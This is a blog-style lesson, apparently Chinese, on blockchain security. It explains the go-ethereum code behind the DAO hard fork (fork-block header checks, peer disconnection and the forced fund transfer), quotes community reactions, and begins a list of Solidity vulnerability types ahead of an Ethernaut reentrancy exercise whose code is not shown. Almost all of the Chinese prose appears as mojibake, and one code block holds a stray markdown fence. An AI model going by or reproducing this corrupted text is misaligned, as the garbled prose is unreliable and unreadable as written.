<p>éœ€è¦è¿ç»­ 10 ä¸ªåŒºå—çš„åŸå› æ˜¯ä¸ºäº†é˜²æ­¢çŸ¿å·¥ä½¿ç”¨ä¿ç•™ä¿¡æ¯æ±¡æŸ“éåˆ†å‰å—å’Œæ–¹ä¾¿è½»èŠ‚ç‚¹å®‰å…¨åŒæ­¥æ•°æ®ã€‚<br>åŒæ—¶ï¼Œæ‰€æœ‰èŠ‚ç‚¹åœ¨æ ¡éªŒåŒºå—å¤´æ—¶ï¼Œå¿…é¡»å®‰å…¨åœ°æ ¡éªŒç‰¹æ®Šå­—æ®µä¿¡æ¯ï¼Œæ ¡éªŒåŒºå—æ˜¯å¦å±äºæ­£ç¡®çš„åˆ†å‰ä¸Šã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// consensus/ethash/consensus.go:294 </span><br><span class="line">if err := misc.VerifyDAOHeaderExtraData(chain.Config(), header); err != nil &#123; //â¶</span><br><span class="line">	return err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// consensus/misc/dao.go:47 </span><br><span class="line">func VerifyDAOHeaderExtraData(config *params.ChainConfig, header *types.Header) error &#123; </span><br><span class="line">	if config.DAOForkBlock == nil &#123;//â·</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	limit := new(big.Int).Add(config.DAOForkBlock, params.DAOForkExtraRange) //â¸</span><br><span class="line">	if header.Number.Cmp(config.DAOForkBlock) &lt; 0 || header.Number.Cmp(limit) &gt;= 0 &#123;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">	if config.DAOForkSupport &#123;</span><br><span class="line">		if !bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123; //â¹</span><br><span class="line">			return ErrBadProDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if bytes.Equal(header.Extra, params.DAOForkBlockExtra) &#123;//âº</span><br><span class="line">			return ErrBadNoDAOExtra</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	// All ok, header has the same extra-data we expect</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>â¶ åœ¨æ ¡éªŒåŒºå—å¤´æ—¶å¢åŠ  DAO åŒºå—å¤´è¯†åˆ«æ ¡éªŒã€‚</li>
<li>â· å¦‚æœèŠ‚ç‚¹æœªè®¾ç½®åˆ†å‰ç‚¹ï¼Œåˆ™ä¸æ ¡éªŒã€‚</li>
<li>â¸ ç¡®ä¿åªéœ€åœ¨ DAO åˆ†å‰ç‚¹çš„ 10 ä¸ªåŒºå—ä¸Šæ ¡éªŒã€‚</li>
<li>â¹ å¦‚æœèŠ‚ç‚¹å…è®¸åˆ†å‰ï¼Œåˆ™è¦æ±‚åŒºå—å¤´ Extra å¿…é¡»ç¬¦åˆè¦æ±‚ã€‚</li>
<li>âº å½“ç„¶ï¼Œå¦‚æœèŠ‚ç‚¹ä¸å…è®¸åˆ†å‰ï¼Œåˆ™ä¹Ÿä¸èƒ½åœ¨åŒºå—å¤´ä¸­åŠ å…¥éåˆ†å‰é“¾çš„ Extra ç‰¹æ®Šä¿¡æ¯ã€‚</li>
</ul>
<p>è¿™ç§ <code>config.DAOForkBlock</code> å¼€å…³ï¼Œç±»ä¼¼äºäº’è”ç½‘å…¬å¸äº§å“æ–°åŠŸèƒ½ç°åº¦ä¸Šçº¿çš„åŠŸèƒ½å¼€å…³ã€‚åœ¨åŒºå—é“¾ä¸Šï¼Œå¯ä»¥å…ˆå®ç°åŠŸèƒ½ä»£ç é€»è¾‘ã€‚è‡³äºä½•æ—¶å¯ç”¨ï¼Œåˆ™å¯ä»¥åœ¨ç¤¾åŒºã€å¼€å‘è€…è®¨è®ºåï¼Œç¡®å®šæœ€ç»ˆçš„å¼€å¯æ—¶é—´ã€‚å½“ç„¶åŒºå—é“¾ä¸ŠåŒºå—é«˜åº¦ç­‰ä»·äºæ—¶é—´æˆ³ï¼Œæ¯”å¦‚ DAO åˆ†å‰ç‚¹ 1920000 ä¹Ÿæ˜¯è®¨è®ºåæ•²å®šã€‚</p>
<h3 id="å¦‚ä½•åˆ†ç¦»ç½‘ç»œï¼Ÿ"><a href="#å¦‚ä½•åˆ†ç¦»ç½‘ç»œï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ†ç¦»ç½‘ç»œï¼Ÿ"></a><strong>å¦‚ä½•åˆ†ç¦»ç½‘ç»œï¼Ÿ</strong></h3><p>å¦‚æœåˆ†å‰åä¸èƒ½å¿«é€Ÿåœ°åˆ†ç¦»ç½‘ç»œï¼Œä¼šå¯¼è‡´èŠ‚ç‚¹å‡ºç°å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ã€‚è¿™æ¬¡çš„ The DAO åˆ†å‰å¤„ç†æ˜¯é€šè¿‡ç‰¹å®šä»£ç æ‹¦æˆªå®ç°ã€‚ä¸åº”è¯¥è®©èŠ‚ç‚¹åŒæ—¶æˆä¸ºä¸¤ä¸ªé˜µè¥çš„ä¸­ç»§ç‚¹ï¼Œåº”åˆ†ç¦»å‡ºä¸¤ä¸ªç½‘ç»œï¼Œä»¥è®©å…¶äº’ä¸å¹²é¢„ã€‚The DAO ç¡¬åˆ†å‰çš„å¤„ç†æ–¹å¼æ˜¯ï¼šèŠ‚ç‚¹è¿æ¥æ¡æ‰‹åï¼Œå‘å¯¹æ–¹è¯·æ±‚åˆ†å‰åŒºå—å¤´ä¿¡æ¯ã€‚åœ¨ 15 ç§’å¿…é¡»å“åº”ï¼Œå¦åˆ™æ–­å¼€è¿æ¥ã€‚</p>
<p>ä»£ç å®ç°æ˜¯åœ¨ <code>eth/handler.go</code> æ–‡ä»¶ä¸­ï¼Œåœ¨æ¶ˆæ¯å±‚è¿›è¡Œæ‹¦æˆªå¤„ç†ã€‚èŠ‚ç‚¹æ¡æ‰‹åï¼Œå¼€å§‹ 15 ç§’å€’è®¡æ—¶ï¼Œä¸€æ—¦å€’è®¡æ—¶ç»“æŸï¼Œåˆ™æ–­å¼€è¿æ¥ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:300</span><br><span class="line">	p.forkDrop = time.AfterFunc(daoChallengeTimeout, func() &#123;</span><br><span class="line">		p.Log().Debug(&quot;Timed out DAO fork-check, dropping&quot;)</span><br><span class="line">		pm.removePeer(p.id)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>

<p>åœ¨å€’è®¡æ—¶å‰ï¼Œéœ€è¦å‘å¯¹æ–¹ç´¢è¦åŒºå—å¤´ä¿¡æ¯ï¼Œä»¥è¿›è¡Œåˆ†å‰æ ¡éªŒã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:297</span><br><span class="line">	if err := p.RequestHeadersByNumber(daoBlock.Uint64(), 1, 0, false); err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">æ­¤æ—¶ï¼Œå¯¹æ–¹åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œå¦‚æœå­˜åœ¨æ­¤åŒºå—å¤´åˆ™è¿”å›ï¼Œå¦åˆ™å¿½ç•¥ã€‚</span><br><span class="line"></span><br><span class="line">```go</span><br><span class="line">// eth/handler.go:348</span><br><span class="line">	case msg.Code == GetBlockHeadersMsg:  </span><br><span class="line">		var query getBlockHeadersData</span><br><span class="line">		if err := msg.Decode(&amp;query); err != nil &#123;</span><br><span class="line">			return errResp(ErrDecode, &quot;%v: %v&quot;, msg, err)</span><br><span class="line">		&#125;</span><br><span class="line">		hashMode := query.Origin.Hash != (common.Hash&#123;&#125;)</span><br><span class="line">		first := true</span><br><span class="line">		maxNonCanonical := uint64(100) </span><br><span class="line">		var (</span><br><span class="line">			bytes   common.StorageSize</span><br><span class="line">			headers []*types.Header</span><br><span class="line">			unknown bool</span><br><span class="line">		)</span><br><span class="line">		//çœç•¥ä¸€éƒ¨åˆ† ...</span><br><span class="line">		return p.SendBlockHeaders(headers)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ï¼Œæœ‰å‡ ç§æƒ…å†µå‡ºç°ã€‚æ ¹æ®ä¸åŒæƒ…å†µåˆ†åˆ«å¤„ç†ï¼š</p>
<ol>
<li>æœ‰è¿”å›åŒºå—å¤´ï¼š</li>
</ol>
<p>å¦‚æœè¿”å›çš„åŒºå—å¤´ä¸ä¸€è‡´ï¼Œåˆ™æ ¡éªŒä¸é€šè¿‡ï¼Œç­‰å¾…å€’è®¡æ—¶ç»“æŸã€‚å¦‚æœåŒºå—å¤´ä¸€è‡´ï¼Œåˆ™æ ¹æ®å‰é¢æåˆ°çš„æ ¡éªŒåˆ†å‰åŒºå—æ–¹å¼æ£€æŸ¥ã€‚æ ¡éªŒå¤±è´¥ï¼Œæ­¤ç›´æ¥æ–­å¼€è¿æ¥ï¼Œè¯´æ˜å·²ç»å±äºä¸åŒåˆ†å‰ã€‚æ ¡éªŒé€šè¿‡ï¼Œåˆ™å…³é—­å€’è®¡æ—¶ï¼Œå®Œæˆæ ¡éªŒã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:465</span><br><span class="line">if p.forkDrop != nil &amp;&amp; pm.chainconfig.DAOForkBlock.Cmp(headers[0].Number) == 0 &#123; </span><br><span class="line">				p.forkDrop.Stop()</span><br><span class="line">				p.forkDrop = nil</span><br><span class="line"> </span><br><span class="line">				if err := misc.VerifyDAOHeaderExtraData(pm.chainconfig, headers[0]); err != nil &#123;</span><br><span class="line">					p.Log().Debug(&quot;Verified to be on the other side of the DAO fork, dropping&quot;)</span><br><span class="line">					return err</span><br><span class="line">				&#125;</span><br><span class="line">				p.Log().Debug(&quot;Verified to be on the same side of the DAO fork&quot;)</span><br><span class="line">				return nil</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>æ²¡æœ‰è¿”å›åŒºå—å¤´ï¼š</li>
</ol>
<p>å¦‚æœè‡ªå·±ä¹Ÿæ²¡æœ‰åˆ°è¾¾åˆ†å‰é«˜åº¦ï¼Œåˆ™ä¸æ ¡éªŒï¼Œå‡å®šåŒæ–¹åœ¨åŒä¸€ä¸ªç½‘ç»œã€‚ä½†æˆ‘è‡ªå·±å·²ç»åˆ°è¾¾åˆ†å‰é«˜åº¦ï¼Œåˆ™è€ƒè™‘å¯¹æ–¹çš„ TD æ˜¯å¦é«˜äºæˆ‘çš„åˆ†å‰å—ã€‚å¦‚æœæ˜¯ï¼Œåˆ™åŒ…å®¹ï¼Œæš‚æ—¶è®¤ä¸ºå±äºåŒä¸€ç½‘ç»œã€‚å¦åˆ™ï¼Œåˆ™æ ¡éªŒå¤±è´¥ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:442 </span><br><span class="line">if len(headers) == 0 &amp;&amp; p.forkDrop != nil &#123; </span><br><span class="line">	verifyDAO := true</span><br><span class="line"></span><br><span class="line">	if daoHeader := pm.blockchain.GetHeaderByNumber(pm.chainconfig.DAOForkBlock.Uint64()); daoHeader != nil &#123;</span><br><span class="line">		if _, td := p.Head(); td.Cmp(pm.blockchain.GetTd(daoHeader.Hash(), daoHeader.Number.Uint64())) &gt;= 0 &#123;</span><br><span class="line">			verifyDAO = false</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	if verifyDAO &#123;</span><br><span class="line">		p.Log().Debug(&quot;Seems to be on the same side of the DAO fork&quot;)</span><br><span class="line">		p.forkDrop.Stop()</span><br><span class="line">		p.forkDrop = nil</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è½¬ç§»èµ„äº§"><a href="#è½¬ç§»èµ„äº§" class="headerlink" title="è½¬ç§»èµ„äº§"></a><strong>è½¬ç§»èµ„äº§</strong></h3><p>ä¸Šè¿°æ‰€åšçš„ä¸€åˆ‡å‡ä¸ºå®‰å…¨ã€ç¨³å®šçš„ç¡¬åˆ†å‰ï¼Œéš”ç¦»ä¸¤ä¸ªç½‘ç»œã€‚ç¡¬åˆ†å‰çš„ç›®çš„æ˜¯ï¼Œä»¥äººä¸ºä»‹å…¥çš„æ–¹å¼æ‹¦æˆªæ”»å‡»è€…èµ„äº§ã€‚ä¸€æ—¦åˆ°è¾¾åˆ†å‰ç‚¹ï¼Œåˆ™ç«‹å³æ¿€æ´»èµ„äº§è½¬ç§»æ“ä½œã€‚é¦–å…ˆï¼ŒçŸ¿å·¥åœ¨æŒ–åˆ°åˆ†å‰ç‚¹æ—¶ï¼Œéœ€æ‰§è¡Œè½¬ç§»æ“ä½œï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:877</span><br><span class="line">func (w *worker) commitNewWork(interrupt *int32, noempty bool, timestamp int64) &#123;</span><br><span class="line">	// ...</span><br><span class="line">// Create the current work task and check any fork transitions needed</span><br><span class="line">	env := w.current</span><br><span class="line">	if w.config.DAOForkSupport &amp;&amp; w.config.DAOForkBlock != nil &amp;&amp; w.config.DAOForkBlock.Cmp(header.Number) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(env.state)</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶æ¬¡ï¼Œä»»ä½•èŠ‚ç‚¹åœ¨æ¥æ”¶åŒºå—ï¼Œè¿›è¡Œæœ¬åœ°å¤„ç†æ ¡éªŒæ—¶åŒæ ·éœ€è¦åœ¨åˆ†å‰ç‚¹æ‰§è¡Œï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// core/state_processor.go:66</span><br><span class="line">func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123;</span><br><span class="line">	//...</span><br><span class="line">	// Mutate the block and state according to any hard-fork specs</span><br><span class="line">	if p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(statedb)</span><br><span class="line">	&#125;</span><br><span class="line">	//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è½¬ç§»èµ„é‡‘ä¹Ÿæ˜¯é€šè¿‡å–æ¬¾åˆçº¦å¤„ç†ã€‚å°† The DAO åˆçº¦åŒ…æ‹¬å­åˆçº¦çš„èµ„é‡‘ï¼Œå…¨éƒ¨è½¬ç§»åˆ°æ–°åˆçº¦ä¸­ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">func ApplyDAOHardFork(statedb *state.StateDB) &#123;</span><br><span class="line">	// Retrieve the contract to refund balances into</span><br><span class="line">	if !statedb.Exist(params.DAORefundContract) &#123;</span><br><span class="line">		statedb.CreateAccount(params.DAORefundContract)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Move every DAO account and extra-balance account funds into the refund contract</span><br><span class="line">	for _, addr := range params.DAODrainList() &#123;</span><br><span class="line">		statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr))</span><br><span class="line">		statedb.SetBalance(addr, new(big.Int))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è‡³æ­¤ï¼Œåˆçº¦èµ„é‡‘å·²å…¨éƒ¨å¼ºåˆ¶è½¬ç§»åˆ°æ–°åˆçº¦ã€‚</p>
<hr>
<p>é€šè¿‡ä»¥ä¸Šè§£å†³æ–¹æ¡ˆï¼ŒTHE DAOæŠ•èµ„è€…çš„èµ„äº§è·å¾—äº†ä¿éšœã€‚ä½†æ˜¯ä¹Ÿå¼•èµ·äº†ä¸å°‘äº‰è®®ã€‚</p>
<p>Redditä¸Šæœ‰äººè¯´ï¼š</p>
<blockquote>
<p>â€œä»¥å¤ªåŠåŸºé‡‘ä¼šå‚ä¸DAOé¡¹ç›®å°±æ˜¯ä¸ªé”™è¯¯ã€‚å› ä¸ºæˆ‘è§‰å¾—ä»¥å¤ªåŠåº”è¯¥æŒ‘é€‰ä¸€äº›èƒ½å¤ŸæˆåŠŸçš„é¡¹ç›®ä»¥åŠå®éªŒæ¥æä¾›åŸºç¡€æ¶æ„ï¼Œè€Œåè¿‡æ¥å®ƒä»¬è¦æƒ³æˆåŠŸï¼Œåˆ™éœ€è¦ä¸€ä¸ªå¼ºå¤§çš„åŸºç¡€ï¼Œè€Œä¸”è¦æ±‚å¦è¯šå¾—é¢å¯¹æŒ‘æˆ˜ã€‚ç¡¬åˆ†å‰æè®®çš„å¦¥åï¼Œç ´åäº†è¿™ç§å¦è¯šï¼Œè€Œä¸”æ„å‘³ç€DAOé¡¹ç›®ä¼šåè¿‡æ¥å½±å“å®ƒä»¬è‡ªå·±çš„åŸºç¡€æ¶æ„ã€‚å°±æˆ‘è€Œè¨€ï¼Œè¿™æ˜¯å®Œå…¨æ— æ³•æ¥å—çš„ï¼Œä¹Ÿè¿èƒŒäº†æ›¾ç»å¸å¼•æˆ‘çš„ä»¥å¤ªåŠåŸåˆ™ã€‚â€<br>ç¡¬åˆ†å‰æ˜¯ä¸€ä¸ªæœ‰æ•ˆé€‰é¡¹ï¼Œä½†æ˜¯å®ƒæ˜¯é’ˆå¯¹éœ€è¦ç´§æ€¥æ•´æ”¹ä»¥å¤ªåŠåè®®æœ¬èº«çš„æƒ…å†µçš„ï¼Œè€Œéåˆ©ç”¨ä»¥å¤ªåŠå¹³å°çš„å…¶ä»–é¡¹ç›®ã€‚<br>ä»¥å¤ªåŠåŸºé‡‘ä¼šå·²ç»å‚ä¸è¿›æ¥ï¼Œè€Œä¸”æ¨å¹¿äº†THE DAOé¡¹ç›®ï¼Œè¿™æ•´ä¸ªäº‹ä»¶å°±æ˜¯ä¸ªé”™è¯¯ï¼Œå®ƒåªä¼šæŸå®³äººä»¬å¯¹ä»¥å¤ªåŠä½œä¸ºå…¶ä»–é¡¹ç›®åŸºç¡€æ¶æ„çš„ä¿¡ä»»ã€‚<br>æˆ‘å¸Œæœ›ä»–ä»¬èƒ½çº æ­£è¿™ä¸ªé”™è¯¯ã€‚</p>
</blockquote>
<p>ä¹Ÿæœ‰å…¶ä»–äººè¡¨ç¤ºï¼š</p>
<blockquote>
<p>â€œåœ¨å¤´å‡ å¤©æˆ‘åšäº†ä¸ªåå†³å®šï¼Œç„¶åæˆ‘æŸå¤±äº†2ä¸‡ä¸ªä»¥å¤ªå¸ï¼Œèƒ½æŠŠè¿™äº›ä»¥å¤ªå¸ä¹Ÿè¿˜ç»™æˆ‘å—ï¼Ÿå…ˆè°¢è°¢äº†ï¼â€</p>
</blockquote>
<p>æœ€åï¼š</p>
<blockquote>
<p>â€œä»¥å¤ªåŠä¸€ç›´æŒ‰å…¶ç›®æ ‡åœ¨è¿ä½œã€‚æˆ‘è§‰å¾—æ—¢ç„¶ç°åœ¨ç®¡ç”¨ï¼Œå°±ä¸è¯¥å»æ›´æ–°è½¯ä»¶ã€‚ä½ å¯ä»¥æƒ³è±¡ä¸€ä¸‹ä½ çš„æŠ•èµ„ä¼šé­é‡çš„é£é™©ã€‚å¦‚æœä½ ä¸æ¸…æ¥šä½ çš„æŠ•èµ„æƒ…å†µï¼Œé‚£ä½ å°±ä¼šé‡åˆ°æœªçŸ¥çš„é£é™©ã€‚å…¶ä»–ä»»ä½•ä¸œè¥¿éƒ½ä¼šæ˜¯ä¸­å¤®æƒå¨æœºæ„çš„ä¸€ç§æ´åŠ©ï¼Œå’ŒåŠ å¯†ä¸–ç•Œå½¢æˆå¯¹ç…§ã€‚ç›¸ä¼¼çš„ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆé›·æ›¼å…„å¼Ÿä¼šå¤±è´¥â€”â€”å› ä¸ºäº¤æ˜“å°±æ˜¯äº¤æ˜“ï¼Œå¦‚æœä½ ä¸ºäº†æŸäº›ç‰¹å®šå‚ä¸è€…è¯¥æ”¹å˜è§„åˆ™ï¼Œé‚£ä¹ˆå…¶ä»–å‚ä¸è€…ä¹Ÿä¼šæƒ³è¦è¿™ç§ç‰¹æ®Šå¾…é‡ã€‚â€</p>
</blockquote>
<p><strong>é¡¹ç›®å¤ªå¤§ï¼Œä¸èƒ½å¤±è´¥</strong></p>
<p>é›·æ›¼å…„å¼Ÿäº‹ä»¶å‘ç”Ÿä¸€ä¸ªæœˆåï¼Œå…¶ä»–é“¶è¡Œå°±å¾—åˆ°äº†ç‰¹æ®Šå¾…é‡ï¼Œä½ å¯ä»¥è‡ªå·±è€ƒé‡è¿™æ˜¯å¦æ˜¯å¥½äº‹â€”â€”è¿™å’Œæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µç›¸ä¼¼ã€‚THE DAOä¸æ˜¯ä¸€ä¸ªå­¤å²›ã€‚</p>
<p>è¿™ä¸ªé¡¹ç›®å¤ªå¤§äº†ï¼Œå®ƒä¸èƒ½å‡ºç°é—®é¢˜ï¼Œè¿™æ˜¯ä»¥å¤ªåŠç”Ÿæ€ç³»ç»Ÿçš„è§‚ç‚¹ä¹‹ä¸€ã€‚å¯èƒ½å¤§å®¶ä¼šæ³¨æ„åˆ°ï¼Œä»¥å¤ªåŠåŸºé‡‘ä¼šä¸­ä¹Ÿæœ‰å‡ ä¸ªäººæ˜¯DAOä»£å¸æ‹¥æœ‰è€…åŠTHE DAOé¡¹ç›®é¡¾é—®ã€‚ç”šè‡³æ˜¯Gavin Woodâ€”â€”ä»¥å¤ªåŠæœ€åˆåˆ›å§‹äººä¹‹ä¸€ï¼Œä¹Ÿåœ¨åšå®¢ä¸­æ”¯æŒè¿™ä¸ªåˆ†å‰ã€‚</p>
<p>åœ¨ä»–çš„è§‚ç‚¹ä¸­ï¼Œå¾ˆæœ‰å¯èƒ½å…¶ä»–å¤§å‹é¡¹ç›®ä¹Ÿä¼šéœ€è¦æ•‘åŠ©ï¼Œè€Œä»¥å¤ªåŠåŸºé‡‘ä¼šä¹‹å‰å·²ç»é‡åˆ°è¿‡å…ˆä¾‹ï¼Œå¯èƒ½éœ€è¦å†æ¬¡è¦æ±‚çŸ¿å·¥æ¥é‡å†™å†å²ã€‚å¾ˆæ˜æ˜¾è¿™å’Œé“¶è¡Œæ•‘åŠ©éå¸¸ç›¸ä¼¼ï¼šé“¶è¡Œè¦æ‰¿æ‹…å¤§é‡é£é™©æ¥æœŸå¾…è¾ƒå¤§å›æŠ¥ï¼Œè€Œå½“è¿™äº›äº¤æ˜“å‡ºç°é—®é¢˜æ—¶ï¼Œçº³ç¨äººå°±ä¼šâ€œæ‹¯æ•‘â€ä»–ä»¬ï¼ˆé™¤äº†å¯èƒ½çš„é›·æ›¼å…„å¼Ÿï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§é£é™©çš„ä¸å¯¹ç§°æ€§å¯¹æ¿€åŠ±å¸‚åœºå‚ä¸è€…æ¥è¯´ï¼Œä¸æ˜¯å¥½åŠæ³•ã€‚</p>
<p>è¿™æ˜¯ä¸¤ä¸ªæç«¯ï¼Œä½†æ˜¯å¤§å¤šæ•°äººéƒ½ä¼šå€¾å‘äºå…¶ä¸­çš„ä¸€ä¸ªã€‚æ³•å¾‹ä¸“å®¶éƒ½ä¼šå¦‚æ­¤ï¼Œæ›´åˆ«ææ™®é€šäººã€‚</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">åŒºå—é“¾å®‰å…¨ - DAOæ”»å‡»äº‹ä»¶è§£æ</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/">https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/">https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/the-verge-hack-explained-part-1">å¹²è´§ | Verge æ”»å‡»è§£æï¼ŒPart-1</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32325">å¹²è´§ | Verge æ”»å‡»è§£æï¼ŒPart-2</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/93713">https://www.8btc.com/article/93713</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/">http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/">http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">https://blog.csdn.net/u011721501/article/details/79450122</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2019/04/07/dao/">https://learnblockchain.cn/2019/04/07/dao/</a></li>
<li><a href="https://link.zhihu.com/?target=http://eips.ethereum.org/EIPS/eip-779">EIP 779: Hardfork Meta: DAO Fork</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.slock.it/hard-fork-specification-24b889e70703">Hard Fork Specification</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/go-ethereum/pull/2814">PR#2814-finalize the DAO fork</a></li>
<li><a href="https://link.zhihu.com/?target=http://chainb.com/?P=Cont&id=1290">http://chainb.com/?P=Cont&id=1290</a></li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯13-åŒºå—é“¾å®‰å…¨-2"><a href="#åŒºå—é“¾æŠ€æœ¯13-åŒºå—é“¾å®‰å…¨-2" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯13:åŒºå—é“¾å®‰å…¨(2)"></a>åŒºå—é“¾æŠ€æœ¯13:åŒºå—é“¾å®‰å…¨(2)</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­çœ‹ä¸€çœ‹ä»¥å¤ªåŠä¸­å¸¸è§çš„ä»£ç ç¼–å†™çš„å®‰å…¨é—®é¢˜ã€‚ä¸‹é¢åˆ—å‡ºäº†å·²çŸ¥çš„å¸¸è§çš„ Solidity çš„æ¼æ´ç±»å‹ï¼š</p>
<ol>
<li>Reentrancy - é‡å…¥</li>
<li>Access Control - è®¿é—®æ§åˆ¶</li>
<li>Arithmetic Issues - ç®—æœ¯é—®é¢˜ï¼ˆæ•´æ•°ä¸Šä¸‹æº¢å‡ºï¼‰</li>
<li>Unchecked Return Values For Low Level Calls - æœªä¸¥æ ¼åˆ¤æ–­ä¸å®‰å…¨å‡½æ•°è°ƒç”¨è¿”å›å€¼</li>
<li>Denial of Service - æ‹’ç»æœåŠ¡</li>
<li>Bad Randomness - å¯é¢„æµ‹çš„éšæœºå¤„ç†</li>
<li>Front Running</li>
<li>Time manipulation</li>
<li>Short Address Attack - çŸ­åœ°å€æ”»å‡»</li>
<li>Unknown Unknowns - å…¶ä»–æœªçŸ¥</li>
</ol>
<p>ä¸ºäº†è®©æœ¬èŠ‚æ›´æœ‰è¶£ï¼Œè¿™æ¬¡è¯¾æˆ‘ä»¬å°è¯•ä½¿ç”¨åœ¨çº¿çš„<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix</a>ç»“åˆethernautçœ‹ä¸€ä¸‹ä¸Šæ¬¡è¯¾çš„æ”»å‡»æ•ˆæœã€‚Remix IDEæ˜¯å¼€å‘ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦çš„åœ¨çº¿IDEå·¥å…·ï¼Œéƒ¨ç½²ç®€å•çš„æ™ºèƒ½åˆçº¦éå¸¸æ–¹ä¾¿ã€‚éœ€è¦ä½¿ç”¨è°·æ­Œæˆ–è€…ç«ç‹çš„æµè§ˆå™¨ï¼Œä¸”å®‰è£…äº†MetaMask æ’ä»¶ã€‚</p>
<p>Ethernaut æ˜¯ Zeppelin æä¾›çš„ä¸€ä¸ªåŸºäº Web3 å’Œ Solidity çš„æ™ºèƒ½åˆçº¦å®¡è®¡è®­ç»ƒå¹³å°ï¼Œå¤ç°äº†æ™ºèƒ½åˆçº¦ä¸­å¯èƒ½å‡ºç°çš„å„ç§å®‰å…¨é—®é¢˜ã€‚ç°åœ¨å·²ç»æœ‰20+é¢˜ç›®ã€‚</p>
<ol>
<li>é¦–å…ˆï¼Œæˆ‘ä»¬ç›´æ¥æ¥çœ‹é—®é¢˜10ï¼Œreentrancyé‡å…¥é—®é¢˜ã€‚è¿™ä¸ªé—®é¢˜å’Œæˆ‘ä»¬ä¸Šæ¬¡è®²çš„é—®é¢˜å¾ˆåƒã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233094.jpg" alt="img"></p>
<p>é¦–å…ˆæ¥å¤ä¹ ä¸€ä¸‹è¿™ä¸ªä»£ç çš„é—®é¢˜ï¼Œä»¥åŠå¦‚ä½•å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p>
<p>æœ‰äº†åŸºæœ¬æ€è·¯ä¹‹åï¼Œå¯ä»¥æ’°å†™ä»£ç ï¼š</p>
